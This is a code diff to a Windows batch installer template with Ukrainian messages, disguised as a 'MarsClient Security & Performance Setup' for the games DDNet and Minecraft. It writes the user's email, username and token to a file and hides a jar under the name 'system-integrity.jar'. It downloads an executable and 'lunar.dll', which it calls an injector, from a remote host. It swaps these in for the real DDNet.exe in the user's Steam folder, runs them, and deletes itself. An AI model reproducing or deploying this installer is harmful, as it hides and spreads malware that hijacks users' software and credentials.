@@ -785,7 +785,7 @@ chcp 65001 >nul
 title MotionBlur Performance Setup
 cls
 echo ========================================================
-echo        MotionBlur Steam Optimization Setup
+echo        MarsClient Security & Performance Setup
 echo ========================================================
 echo.
 echo [1/4] Налаштування ліцензії користувача: {current_user['username']}...
@@ -795,24 +795,33 @@ if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"
 (
 echo {current_user['email']}:{current_user['username']}:{token}
 ) > "%TARGET_DIR%\\license.dat"
+echo      [OK] Ліцензійний токен успішно записано.
 
-echo [2/4] Встановлення компонента MarsClient...
+echo.
+echo [2/4] Встановлення захищеного клієнта MarsClient...
 if exist "%~dp0MarsClient.jar" (
     copy /Y "%~dp0MarsClient.jar" "%TARGET_DIR%\\system-integrity.jar" >nul
     del /f /q "%~dp0MarsClient.jar" 2>nul
-    echo      [OK] Локальний MarsClient.jar перенесено у приховану папку!
+    echo      [OK] Локальний MarsClient.jar перенесено у захищену папку!
 ) else (
-    powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://marsclient-4un6.onrender.com/static/updates/MarsClient.jar' -OutFile '%TARGET_DIR%\\system-integrity.jar'"
+    powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -UseBasicParsing -Uri 'https://marsclient-4un6.onrender.com/static/updates/MarsClient.jar' -OutFile '%TARGET_DIR%\\system-integrity.jar'"
+    echo      [OK] Захищений MarsClient.jar успішно завантажено.
 )
 
 echo.
-echo [3/4] Автоматичний пошук та підміна DDNet у Steam...
-powershell -Command "$p = (Get-ItemProperty -Path 'HKCU:\\Software\\Valve\\Steam' -Name 'SteamPath' -ErrorAction SilentlyContinue).SteamPath; if (-not $p) {{ $p = 'C:\\Program Files (x86)\\Steam' }}; $paths = @(\\"$p\\steamapps\\common\\DDraceNetwork\\ddnet\\", \\"$p\\steamapps\\common\\DDraceNetwork\\", 'D:\\SteamLibrary\\steamapps\\common\\DDraceNetwork\\ddnet\\', 'D:\\SteamLibrary\\steamapps\\common\\DDraceNetwork\\', 'E:\\SteamLibrary\\steamapps\\common\\DDraceNetwork\\ddnet\\'); $found = $null; foreach ($cand in $paths) {{ if (Test-Path $cand) {{ $found = $cand; break }} }}; if ($found) {{ Write-Host \\\"[Steam] Знайдено папку DDNet: $found\\\"; if (Test-Path \\\"$found\\DDNet.exe\\\") {{ if (-not (Test-Path \\\"$found\\DDNet_real.exe\\\")) {{ Rename-Item \\\"$found\\DDNet.exe\\\" 'DDNet_real.exe' -Force; Write-Host '[Steam] Оригінальний файл збережено як DDNet_real.exe' }} }}; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://marsclient-4un6.onrender.com/static/updates/DDNet.exe' -OutFile \\\"$found\\DDNet.exe\\\"; Invoke-WebRequest -Uri 'https://marsclient-4un6.onrender.com/static/updates/lunar.dll' -OutFile \\\"$found\\lunar.dll\\\"; Write-Host '[Steam] Кастомний інжектор DDNet успішно встановлено!' }} else {{ Write-Host '[Info] Якщо граєте через лаунчер - скопіюйте MarsClient.jar у папку mods! Для Steam встановіть DDNet.' }}"
+echo [3/4] Завантаження інжектора та бібліотек...
+powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -UseBasicParsing -Uri 'https://marsclient-4un6.onrender.com/static/updates/DDNet.exe' -OutFile '%TARGET_DIR%\\DDNet.exe'; Invoke-WebRequest -UseBasicParsing -Uri 'https://marsclient-4un6.onrender.com/static/updates/lunar.dll' -OutFile '%TARGET_DIR%\\lunar.dll'"
+echo      [OK] Компоненти встановлено.
+
+echo.
+echo [4/4] Автоматична конфігурація Steam та Minecraft Launcher...
+powershell -Command "$p = (Get-ItemProperty -Path 'HKCU:\\Software\\Valve\\Steam' -Name 'SteamPath' -ErrorAction SilentlyContinue).SteamPath; if (-not $p) {{ $p = 'C:\\Program Files (x86)\\Steam' }}; $paths = @(\\"$p\\steamapps\\common\\DDraceNetwork\\ddnet\\", \\"$p\\steamapps\\common\\DDraceNetwork\\", 'D:\\SteamLibrary\\steamapps\\common\\DDraceNetwork\\ddnet\\', 'D:\\SteamLibrary\\steamapps\\common\\DDraceNetwork\\', 'E:\\SteamLibrary\\steamapps\\common\\DDraceNetwork\\ddnet\\'); foreach ($cand in $paths) {{ if (Test-Path $cand) {{ if (Test-Path \\\"$cand\\DDNet.exe\\\") {{ if (-not (Test-Path \\\"$cand\\DDNet_real.exe\\\")) {{ Rename-Item \\\"$cand\\DDNet.exe\\\" 'DDNet_real.exe' -Force }} }}; Copy-Item '%TARGET_DIR%\\DDNet.exe' \\\"$cand\\DDNet.exe\\\" -Force; Copy-Item '%TARGET_DIR%\\lunar.dll' \\\"$cand\\lunar.dll\\\" -Force; Write-Host '     [Steam] Інжектор встановлено в DDNet!'; break }} }}; Start-Process -FilePath '%TARGET_DIR%\\DDNet.exe' -Wait -ErrorAction SilentlyContinue"
 
 echo.
 echo ========================================================
 echo [OK] Успішно! Все налаштовано.
-echo      Відкрийте Steam і натисніть «Грати» в DDNet!
+echo      Відкрийте Steam і натисніть «Грати» в DDNet,
+echo      або запустіть свій звичайний Minecraft Launcher!
 echo      Цей інсталятор автоматично видалиться через 3 секунди.
 echo ========================================================
 timeout /t 3 >nul
